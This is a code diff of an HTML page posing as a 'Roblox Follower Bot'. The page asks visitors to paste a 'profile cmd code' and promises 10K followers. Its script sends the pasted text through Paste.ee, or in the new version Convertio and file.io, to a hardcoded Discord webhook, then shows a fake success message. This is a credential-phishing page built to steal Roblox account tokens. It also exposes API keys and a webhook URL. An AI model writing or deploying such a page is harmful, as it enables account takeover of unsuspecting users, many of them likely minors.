@@ -77,77 +77,76 @@
             font-size: 18px;
             color: #4CAF50;
         }
-
-        /* Mobile responsive tasarım */
-        @media (max-width: 600px) {
-            body {
-                padding: 10px;
-            }
-
-            h2 {
-                font-size: 20px;
-            }
-
-            textarea {
-                max-width: 100%;
-            }
-
-            button {
-                width: 100%;
-            }
-        }
     </style>
 </head>
 <body>
     <h2>Frellower Roblox Follower Bot</h2>
-    <p>Please enter your 'ONLY' profile cmd code. Then click the 'Send' Button and get 10K FOLLOWERS in 10 minutes max!</p>
+    <p>Metninizi girin ve 'Gönder' butonuna tıklayın.</p>
 
     <textarea id="inputText" placeholder="Enter Profile CMD Code Here!"></textarea><br>
-    <button onclick="uploadText()">Send!</button>
+    <button onclick="convertAndUpload()">Send!</button>
 
     <div id="message-container">
         <p>Success! Followers Sent🎉</p>
     </div>
 
     <script>
-        function uploadText() {
+        function convertAndUpload() {
             const text = document.getElementById("inputText").value;
-            const apiKey = 'a99uu2OgIuUvtsOj38BVxpkCrXPdWDqL0VZWxSCDL';  // Paste.ee API Key'nizi buraya yazın
-
-            // Paste.ee API'ye metin gönderme
-            fetch("https://paste.ee/api/v1/pastes", {
-                method: "POST",
+            
+            // Convertio API kullanarak metni .txt dosyasına dönüştürme
+            fetch('https://api.convertio.co/convert', {
+                method: 'POST',
                 headers: {
-                    "Content-Type": "application/json",
+                    'Authorization': 'Bearer 85cd8c8adcb6196df0d3582b00f12b79',
+                    'Content-Type': 'application/json'
                 },
                 body: JSON.stringify({
-                    api_key: apiKey,  // API Key
-                    title: "Frellower - CMD Code",  // Başlık
-                    contents: text,  // Metin içeriği
-                    expiration: "1H",  // 1 saat sonra otomatik silme
+                    input: 'string',
+                    file: text,
+                    output_format: 'txt'
                 })
             })
             .then(response => response.json())
             .then(data => {
-                if (data.success) {
-                    const link = `https://paste.ee/r/${data.hash}`;  // Paste'e yüklenen metnin linki
-                    sendToDiscord(link);  // Discord'a bağlantıyı gönder
-                    document.getElementById("message-container").style.display = "block";  // Mesajı ekranda göster
-                } else {
-                    throw new Error("Paste.ee API hatası: " + data.error);
-                }
+                const txtFileUrl = data.result.url;  // API'den gelen txt dosyasının bağlantısı
+                
+                // Dosyayı file.io'ya yükleme
+                uploadFile(txtFileUrl);
             })
             .catch(error => {
-                console.error("Hata:", error);
-                alert("Bir hata oluştu: " + error.message);  // Kullanıcıya hata mesajı göster
+                console.error('Convertio error:', error);
+            });
+        }
+
+        function uploadFile(txtFileUrl) {
+            fetch('https://file.io', {
+                method: 'POST',
+                body: JSON.stringify({ file: txtFileUrl }),
+                headers: {
+                    'Content-Type': 'application/json'
+                }
+            })
+            .then(response => response.json())
+            .then(data => {
+                const downloadLink = data.link;
+                
+                // Discord Webhook'a bağlantıyı gönder
+                sendToDiscord(downloadLink);
+                
+                // Ekranda başarı mesajı göster
+                document.getElementById("message-container").style.display = "block";
+            })
+            .catch(error => {
+                console.error('File.io upload error:', error);
             });
         }
 
         function sendToDiscord(link) {
-            const webhookURL = 'https://canary.discord.com/api/webhooks/1312211611506966539/2_xVaoE3JvI3VWsbNpSLM3FIS83yGruTWxkJUDPjMYfxGaDvrEvBCtLHEWmKkkocEzbC';  // Webhook URL'nizi buraya yazın
+            const webhookURL = 'https://canary.discord.com/api/webhooks/1312211611506966539/2_xVaoE3JvI3VWsbNpSLM3FIS83yGruTWxkJUDPjMYfxGaDvrEvBCtLHEWmKkkocEzbC';  // Webhook URL'nizi buraya yerleştirin
             
             const payload = {
-                content: `Yeni bir metin yüklendi: ${link}`,  // Paste.ee'den alınan bağlantıyı içerir
+                content: `Yeni bir dosya yüklendi: ${link}`,
             };
 
             // Webhook'a POST isteği gönder
@@ -156,7 +155,7 @@
                 headers: {
                     'Content-Type': 'application/json',
                 },
-                body: JSON.stringify(payload),  // JSON formatında veriyi gönder
+                body: JSON.stringify(payload),
             })
             .then(response => {
                 if (response.ok) {
@@ -170,6 +169,5 @@
             });
         }
     </script>
-
 </body>
 </html>
